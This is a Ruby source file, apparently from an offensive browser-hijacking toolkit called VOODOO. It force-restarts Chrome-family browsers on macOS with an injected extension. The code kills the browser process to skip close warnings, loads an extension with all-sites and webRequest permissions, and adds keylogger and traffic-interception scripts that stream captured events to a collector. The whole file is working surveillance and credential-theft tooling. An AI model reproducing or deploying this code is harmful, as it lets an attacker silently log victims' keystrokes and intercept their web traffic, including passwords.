require 'voodoo/extension'
require 'voodoo/collector'

module VOODOO

    class Browser
        attr_reader :extension
        attr_accessor :bundle
        attr_accessor :profile
        attr_accessor :process_name

        def initialize(bundle: nil, process_name: nil, profile: nil, extension: Extension.new)
            @bundle = bundle
            @extension = extension
            @process_name = process_name
            @collector_threads = []

            @extension.manifest[:permissions] = ['tabs', '*://*/*', 'webRequest']
            @extension.add_background_script(file: File.join(__dir__, 'js/collector.js'))
        end

        def keylogger(matches: '*://*/*')
            add_script(matches: matches,
                file: File.join(__dir__, 'js/keylogger.js')
            ) do |event|
                yield event
            end
        end

        def intercept(matches: nil, url_include: nil, body_include: nil, header_exists: nil)
            options = {
                matches: matches,
                url_include: url_include,
                body_include: body_include,
                header_exists: header_exists
            }

            add_script(options: options,
                       background: true,
                       file: File.join(__dir__, 'js/intercept.js')
            ) do |event|
                yield event
            end
        end

        def add_permissions(permissions)
            permissions = [permissions] unless permissions.is_a? Array
            @extension.manifest[:permissions] += permissions
        end

        def hijack(urls)
            # kill the browser process twise, to bypass close warning
            `pkill -a -i "#{@process_name}"`
            `pkill -a -i "#{@process_name}"`
            sleep 0.1

            urls = [urls] unless urls.kind_of? Array

            profile_dir = "--profile-directory=\"#{@profile}\"" if @profile != nil
            `open -b "#{@bundle}" --args #{profile_dir} --load-extension="#{@extension.save}" #{urls.shift}`

            if urls.length > 0
                sleep 0.5
                for url in urls
                    `open -b "#{@bundle}" -n -g -j --args #{url}`
                end
            end

            for thread in @collector_threads
                thread.join    
            end
        end

        def Browser.Chrome
            self.new(bundle: 'com.google.Chrome', process_name: 'Google Chrome')
        end

        def Browser.Brave
            self.new(bundle: 'com.brave.Browser', process_name: 'Brave Browser')
        end

        def Browser.Opera
            self.new(bundle: 'com.operasoftware.Opera', process_name: 'Opera')
        end

        def Browser.Edge
            self.new(bundle: 'com.microsoft.edgemac', process_name: 'Microsoft Edge')
        end

        def Browser.Chromium
            self.new(bundle: 'org.chromium.Chromium', process_name: 'Chromium')
        end

        def add_script(content: nil, file: nil, matches: nil, options: {}, background: false)
            if matches != nil && background != false
                puts 'WARNING: matches is ignored when background is set to true.'
            end

            if content == nil && file != nil
                content = File.read file
            end

            if content == nil
                raise StandardError.new(':content or :file argument are required')
            end

            if block_given?
                collector = Collector.new
                collector.on_json {|jsond| yield jsond }
                @collector_threads.push(collector.thread)
                options[:collector_url] = collector.url
            end

            content = build_js('voodoo.js', with_options: options) + "\n" + content
            
            if background == true
                return @extension.add_background_script(content: content)
            else
                if matches == nil
                    matches = '*://*/*'
                end
                
                return @extension.add_content_script(matches, js: [content])
            end
        end

        protected

        def make_collector
            collector = Collector.new
            collector.on_json {|jsond| yield jsond }
            @collector_threads.push(collector.thread)
            return collector
        end

        def build_js(file, with_options: nil)
            js = File.read(File.join(__dir__, 'js', file))
            if with_options != nil
                js = js.gsub('$OPTIONS', JSON.generate(with_options))
            end
            return js
        end
    end

end